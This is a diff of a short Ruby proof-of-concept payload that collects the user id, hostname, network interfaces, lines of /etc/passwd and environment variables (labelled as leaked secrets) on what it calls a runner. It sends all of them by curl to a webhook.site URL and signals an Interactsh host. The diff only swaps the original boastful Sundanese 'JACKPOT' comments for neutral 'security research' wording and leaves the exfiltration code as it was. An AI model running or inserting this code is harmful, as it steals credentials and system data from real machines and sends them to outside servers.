@@ -1,26 +1,26 @@
-# --- POC OOB EXFILTRATION (THE FINISHER) ---
-webhook = "https://webhook.site/e93fb7a2-26c7-4045-a140-92e550408caf"
+# --- BEGIN OOB EXFILTRATION POC ---
+webhook = "https://webhook.site/6b571040-653e-4190-bd43-1081f6e1ef85"
 interact = "jzlnriqracktrqqcvctti0z1e1payovlr.oast.fun"
 
-# Ngahijikeun kabeh 5 bukti maut
-data =  "=== JACKPOT REPORT BY FIRMAN SAHIDIN ===\n"
-data += "1. ID: " + `id`
-data += "2. HOSTNAME: " + `hostname`
-data += "3. NET INTERFACE:\n" + `ip addr | grep inet`
-data += "4. PASSWD FILE:\n" + `head -n 3 /etc/passwd`
-data += "5. WRITE ACCESS: " + `echo 'PWNED-BY-MAMANK' > /tmp/final.txt && cat /tmp/final.txt`
-data += "\n=== SECRETS EXPOSURE ===\n"
+# Consolidating all 5 evidence points into a single report
+data =  "=== SECURITY RESEARCH REPORT: RCE EVIDENCE ===\n"
+data += "1. USER IDENTIFICATION: " + `id`
+data += "2. RUNNER HOSTNAME: " + `hostname`
+data += "3. NETWORK CONFIGURATION:\n" + `ip addr | grep inet`
+data += "4. SYSTEM FILE ACCESS (/etc/passwd):\n" + `head -n 3 /etc/passwd`
+data += "5. ARBITRARY WRITE TEST: " + `echo 'VULNERABILITY_CONFIRMED' > /tmp/poc_verify.txt && cat /tmp/poc_verify.txt`
+data += "\n=== ENVIRONMENT VARIABLES (LEAKED SECRETS) ===\n"
 data += `env | cut -c1-100`
 
-# Taktik 1: Kirim kabeh data ka Webhook (POST)
+# Method 1: Exfiltrate full data via HTTP POST to Webhook
 `curl -s -X POST -H "Content-Type: text/plain" --data "#{data}" #{webhook}`
 
-# Taktik 2: Kirim sinyal ka Interactsh (DNS/HTTP) pikeun bypass firewall
-`curl -s "http://#{interact}/rce-success-$(hostname)"`
+# Method 2: Trigger DNS/HTTP interaction for OOB verification
+`curl -s "http://#{interact}/status-rce-active-$(hostname)"`
 
 puts "========================================"
-puts "🔥 JACKPOT! ALL PROOFS SENT TO OOB SERVERS"
-puts "Check Webhook.site & Interactsh now!"
+puts "Vulnerability Verified: Data sent to OOB servers."
+puts "Please check the Webhook and Interactsh dashboards."
 puts "========================================"
 # --- END POC ---
 
